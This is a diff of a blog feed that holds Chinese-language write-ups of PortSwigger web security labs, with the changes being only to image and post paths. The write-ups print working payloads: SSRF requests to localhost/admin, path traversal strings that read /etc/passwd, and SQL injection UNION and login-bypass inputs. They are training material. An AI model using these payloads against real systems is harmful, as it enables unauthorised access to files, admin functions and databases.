-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against the local server</title><link>/posts/2024/ssrf-lab-basic-ssrf-against-localhost/</link><pubDate>Sat, 30 Nov 2024 10:52:18 +0800</pubDate><guid>/posts/2024/ssrf-lab-basic-ssrf-against-localhost/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>点击任一个商品(View details)进入到商品详细页面，每个页面最底下有题目中提到的查看库存功能，点击按钮后可以查看不同地区的库存情况&lt;img alt="stock check feature" src="/img/ssrf-lab-basic-ssrf-against-localhost-2.jpg">&lt;/li>
-&lt;li>查看库存对应的请求内容与返回如下&lt;/li>
-&lt;/ol>
+&lt;li>点击任一个商品(View details)进入到商品详细页面，每个页面最底下有题目中提到的查看库存功能，点击按钮后可以查看不同地区的库存情况
+&lt;img alt="stock check feature" src="/img/2024/ssrf-lab-basic-ssrf-against-localhost-2.jpg">&lt;/li>
+&lt;li>查看库存对应的请求内容与返回如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a82001403d00c83834cf749008e00de.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
@@ -807,40 +785,39 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">831&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>观察上述请求与返回，可以猜测后端逻辑为请求&lt;code>http://stock.weliketoshop.net:8080&lt;/code>并带上对应参数后将库存数量返回&lt;/li>
-&lt;li>修改&lt;code>stockApi&lt;/code>参数值为题目要求的&lt;code>http://localhost/admin&lt;/code>&lt;/li>
-&lt;/ol>
+&lt;li>修改&lt;code>stockApi&lt;/code>参数值为题目要求的&lt;code>http://localhost/admin&lt;/code>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a82001403d00c83834cf749008e00de.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">107&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http://localhost/admin
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>在返回数据中得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>/admin/delete?username=carlos&lt;/code>，将此拼接在stockApi后即可达成目的&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of file extension with null byte bypass</title><link>/posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</link><pubDate>Thu, 28 Nov 2024 23:21:04 +0800</pubDate><guid>/posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of file extension with null byte bypass</title><link>/posts/2024/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</link><pubDate>Thu, 28 Nov 2024 23:21:04 +0800</pubDate><guid>/posts/2024/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>请求内容同&lt;a href="/posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
+&lt;li>请求内容同&lt;a href="/posts/2024/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
 &lt;li>但不同于前题，题目中提到&lt;code>The application validates that the supplied filename ends with the expected file extension.&lt;/code>；使用&lt;code>null byte&lt;/code>通过文件扩展名检查&lt;/li>
 &lt;li>最终url为&lt;code>/image?filename=../../../etc/passwd%00.jpg&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of start of path</title><link>/posts/file-path-traversal-lab-validate-start-of-path/</link><pubDate>Thu, 28 Nov 2024 23:14:23 +0800</pubDate><guid>/posts/file-path-traversal-lab-validate-start-of-path/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-validate-start-of-path-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-validate-start-of-path-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of start of path</title><link>/posts/2024/file-path-traversal-lab-validate-start-of-path/</link><pubDate>Thu, 28 Nov 2024 23:14:23 +0800</pubDate><guid>/posts/2024/file-path-traversal-lab-validate-start-of-path/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-start-of-path-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-start-of-path-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>请求内容同&lt;a href="/posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
+&lt;li>请求内容同&lt;a href="/posts/2024/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
 &lt;li>但不同于前题，题目中提到&lt;code>The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.&lt;/code>，此题的图片资源请求路径为&lt;code>/image?filename=/var/www/images/xx.jpg&lt;/code>，需要以&lt;code>/var/www/images&lt;/code>为起始路径&lt;/li>
 &lt;li>最终url为&lt;code>/image?filename=/var/www/images/../../../etc/passwd&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</title><link>/posts/file-path-traversal-lab-superfluous-url-decode/</link><pubDate>Thu, 28 Nov 2024 22:53:46 +0800</pubDate><guid>/posts/file-path-traversal-lab-superfluous-url-decode/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-superfluous-url-decode-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-superfluous-url-decode-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</title><link>/posts/2024/file-path-traversal-lab-superfluous-url-decode/</link><pubDate>Thu, 28 Nov 2024 22:53:46 +0800</pubDate><guid>/posts/2024/file-path-traversal-lab-superfluous-url-decode/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-superfluous-url-decode-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-superfluous-url-decode-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>请求内容同&lt;a href="/posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
+&lt;li>请求内容同&lt;a href="/posts/2024/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
 &lt;li>但不同于前题，题目中提到&lt;code>The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.&lt;/code>&lt;/li>
 &lt;li>url编码对应如下
 &lt;ul>
@@ -851,33 +828,33 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/li>
 &lt;li>参考上述编码&lt;code>../../../etc/passwd&lt;/code>的url编码为&lt;code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd&lt;/code>&lt;/li>
 &lt;li>最终url为&lt;code>/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences stripped non-recursively</title><link>/posts/file-path-traversal-lab-sequences-stripped-non-recursively/</link><pubDate>Thu, 28 Nov 2024 22:26:34 +0800</pubDate><guid>/posts/file-path-traversal-lab-sequences-stripped-non-recursively/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-sequences-stripped-non-recursively-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-sequences-stripped-non-recursively-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences stripped non-recursively</title><link>/posts/2024/file-path-traversal-lab-sequences-stripped-non-recursively/</link><pubDate>Thu, 28 Nov 2024 22:26:34 +0800</pubDate><guid>/posts/2024/file-path-traversal-lab-sequences-stripped-non-recursively/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-sequences-stripped-non-recursively-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-sequences-stripped-non-recursively-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>请求内容同&lt;a href="/posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
+&lt;li>请求内容同&lt;a href="/posts/2024/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
 &lt;li>但不同于前题，题目中提到&lt;code>The application strips path traversal sequences from the user-supplied filename before using it.&lt;/code>&lt;/li>
 &lt;li>最终url为&lt;code>/image?filename=....//....//....//etc//passwd&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences blocked with absolute path bypass</title><link>/posts/file-path-traversal-lab-absolute-path-bypass/</link><pubDate>Thu, 28 Nov 2024 22:06:08 +0800</pubDate><guid>/posts/file-path-traversal-lab-absolute-path-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-absolute-path-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-absolute-path-bypass-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences blocked with absolute path bypass</title><link>/posts/2024/file-path-traversal-lab-absolute-path-bypass/</link><pubDate>Thu, 28 Nov 2024 22:06:08 +0800</pubDate><guid>/posts/2024/file-path-traversal-lab-absolute-path-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-absolute-path-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-absolute-path-bypass-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>请求内容同&lt;a href="/posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
+&lt;li>请求内容同&lt;a href="/posts/2024/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
 &lt;li>但不同于前题，题目中提到&lt;code>The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.&lt;/code>&lt;/li>
 &lt;li>最终url为&lt;code>/image?filename=/etc/passwd&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, simple case</title><link>/posts/file-path-traversal-lab-simple/</link><pubDate>Thu, 28 Nov 2024 21:24:48 +0800</pubDate><guid>/posts/file-path-traversal-lab-simple/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-simple-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-simple-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, simple case</title><link>/posts/2024/file-path-traversal-lab-simple/</link><pubDate>Thu, 28 Nov 2024 21:24:48 +0800</pubDate><guid>/posts/2024/file-path-traversal-lab-simple/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-simple-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-simple-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用Burp suite观察此Lab，会发现有许多图片资源请求
-&lt;img alt="Lab description" src="/img/file-path-traversal-lab-simple-2.jpg">&lt;/li>
+&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-simple-2.jpg">&lt;/li>
 &lt;li>题目中明确提到图片资源请求中包含路径遍历漏洞，所以尝试在请求url的&lt;code>filename&lt;/code>参数前段不断新增&lt;code>../&lt;/code>便可达成目的；最终url为&lt;code>/image?filename=../../../etc/passwd&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>/posts/sql-injection-lab-querying-database-version-mysql-microsoft/</link><pubDate>Wed, 27 Nov 2024 21:04:57 +0800</pubDate><guid>/posts/sql-injection-lab-querying-database-version-mysql-microsoft/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>/posts/2024/sql-injection-lab-querying-database-version-mysql-microsoft/</link><pubDate>Wed, 27 Nov 2024 21:04:57 +0800</pubDate><guid>/posts/2024/sql-injection-lab-querying-database-version-mysql-microsoft/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>推测SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
@@ -895,7 +872,7 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;li>url为&lt;code>/filter?category=Gifts' union select 'a1','a2'%23&lt;/code>
 &lt;ul>
 &lt;li>&lt;code>%23&lt;/code>为&lt;code>#&lt;/code>的URL 编码，通过浏览器发送url时需要进行编码；通过Burp Suite时Burp Suite会自动进行编码
-&lt;img alt="Determine the display position" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-2.jpg">&lt;/li>
+&lt;img alt="Determine the display position" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-2.jpg">&lt;/li>
 &lt;/ul>
 &lt;/li>
 &lt;/ol>
@@ -904,27 +881,27 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;ol>
 &lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，MySQL、Microsoft数据库的类型和版本获取方式为&lt;code>SELECT @@version&lt;/code>&lt;/li>
 &lt;li>url为&lt;code>/filter?category=Gifts' union select @@version,null%23&lt;/code>
-&lt;img alt="Retrieve the target data" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-3.jpg">&lt;/li>
+&lt;img alt="Retrieve the target data" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-3.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
 &lt;/ol>
 &lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, finding a column containing text</title><link>/posts/sql-injection-lab-find-column-containing-text/</link><pubDate>Tue, 26 Nov 2024 22:34:27 +0800</pubDate><guid>/posts/sql-injection-lab-find-column-containing-text/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, finding a column containing text</title><link>/posts/2024/sql-injection-lab-find-column-containing-text/</link><pubDate>Tue, 26 Nov 2024 22:34:27 +0800</pubDate><guid>/posts/2024/sql-injection-lab-find-column-containing-text/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>根据&lt;a href="/posts/sql-injection-lab-determine-number-of-columns/">前题&lt;/a>，SQL query为SELECT * FROM table WHERE category = &amp;lsquo;&lt;!-- raw HTML omitted -->&amp;rsquo;，且返回字段数为3&lt;/li>
+&lt;li>根据&lt;a href="/posts/2024/sql-injection-lab-determine-number-of-columns/">前题&lt;/a>，SQL query为SELECT * FROM table WHERE category = &amp;lsquo;&lt;!-- raw HTML omitted -->&amp;rsquo;，且返回字段数为3&lt;/li>
 &lt;li>此题需要将题目给出的随机字符串注入至SQL query所返回的字段内容中&lt;/li>
 &lt;li>解题的url为&lt;code>filter?category=Lifestyle' UNION (select null, '&amp;lt;随机字符串&amp;gt;', null)--&lt;/code>
 &lt;ul>
 &lt;li>例如随机字符串为&lt;code>VGs2z9&lt;/code>，所以url为&lt;code>filter?category=Lifestyle' UNION (select null, 'VGs2z9', null)--&lt;/code>
-&lt;img alt="Lab description" src="/img/sql-injection-lab-find-column-containing-text-2.jpg">&lt;/li>
+&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-find-column-containing-text-2.jpg">&lt;/li>
 &lt;/ul>
 &lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>/posts/sql-injection-lab-determine-number-of-columns/</link><pubDate>Mon, 25 Nov 2024 23:02:48 +0800</pubDate><guid>/posts/sql-injection-lab-determine-number-of-columns/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-determine-number-of-columns-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-determine-number-of-columns-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>/posts/2024/sql-injection-lab-determine-number-of-columns/</link><pubDate>Mon, 25 Nov 2024 23:02:48 +0800</pubDate><guid>/posts/2024/sql-injection-lab-determine-number-of-columns/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-determine-number-of-columns-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-determine-number-of-columns-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>同前题，SQL query为&lt;code>SELECT * FROM table WHERE category = '&amp;lt;category&amp;gt;'&lt;/code>&lt;/li>
@@ -935,9 +912,9 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/ol>
 &lt;/li>
 &lt;li>使用方法1，解题的url为&lt;code>filter?category=Accessories'+UNION+(select+null,+null,+null)--&lt;/code>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on Oracle</title><link>/posts/sql-injection-lab-querying-database-version-oracle/</link><pubDate>Sun, 24 Nov 2024 12:37:06 +0800</pubDate><guid>/posts/sql-injection-lab-querying-database-version-oracle/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on Oracle</title><link>/posts/2024/sql-injection-lab-querying-database-version-oracle/</link><pubDate>Sun, 24 Nov 2024 12:37:06 +0800</pubDate><guid>/posts/2024/sql-injection-lab-querying-database-version-oracle/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>推测SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
@@ -954,40 +931,40 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;ol>
 &lt;li>根据题目Hit，Oracle数据库中的&lt;code>SELECT&lt;/code>语句必须指定&lt;code>FROM&lt;/code>，可以使用Oracle内置的DUAL表来达成目的&lt;/li>
 &lt;li>url为&lt;code>filter?category=Accessories'+union+select+'a1',+'a2'+from+dual+--&lt;/code>
-&lt;img alt="Determine the display position" src="/img/sql-injection-lab-querying-database-version-oracle-2.jpg">&lt;/li>
+&lt;img alt="Determine the display position" src="/img/2024/sql-injection-lab-querying-database-version-oracle-2.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
 &lt;li>获取目标数据
 &lt;ol>
 &lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，Oracle数据库的类型和版本获取方式为&lt;code>SELECT banner FROM v$version&lt;/code>&lt;/li>
 &lt;li>url为&lt;code>filter?category=Accessories'+union+select+banner,+null+from+v$version+--&lt;/code>
-&lt;img alt="Retrieve the target data" src="/img/sql-injection-lab-querying-database-version-oracle-3.jpg">&lt;/li>
+&lt;img alt="Retrieve the target data" src="/img/2024/sql-injection-lab-querying-database-version-oracle-3.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
 &lt;/ol>
 &lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability allowing login bypass</title><link>/posts/sql-injection-lab-login-bypass/</link><pubDate>Sat, 23 Nov 2024 22:46:24 +0800</pubDate><guid>/posts/sql-injection-lab-login-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-login-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-login-bypass-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability allowing login bypass</title><link>/posts/2024/sql-injection-lab-login-bypass/</link><pubDate>Sat, 23 Nov 2024 22:46:24 +0800</pubDate><guid>/posts/2024/sql-injection-lab-login-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>点击My account后看到登录画面
-&lt;img alt="Lab description" src="/img/sql-injection-lab-login-bypass-2.jpg">&lt;/li>
+&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-2.jpg">&lt;/li>
 &lt;li>根据题目此登录逻辑包含SQL注入问题，猜测后端的SQL query为&lt;code>SELECT * FROM users WHERE username = '&amp;lt;username&amp;gt;' AND password = '&amp;lt;password&amp;gt;'&lt;/code>，如何将&lt;code>AND&lt;/code>之后的查询条件隐去，为此题的目标&lt;/li>
 &lt;li>通过&lt;code>&amp;lt;username&amp;gt;&lt;/code>将后面SQL query去除，尝试使用&lt;code>administrator'--&lt;/code>作为参数传入，将后端的SQL qeruy变为&lt;code>SELECT * FROM users WHERE username = 'administrator'--' AND password = '&amp;lt;password&amp;gt;'&lt;/code>
-&lt;img alt="Lab description" src="/img/sql-injection-lab-login-bypass-3.jpg">&lt;/li>
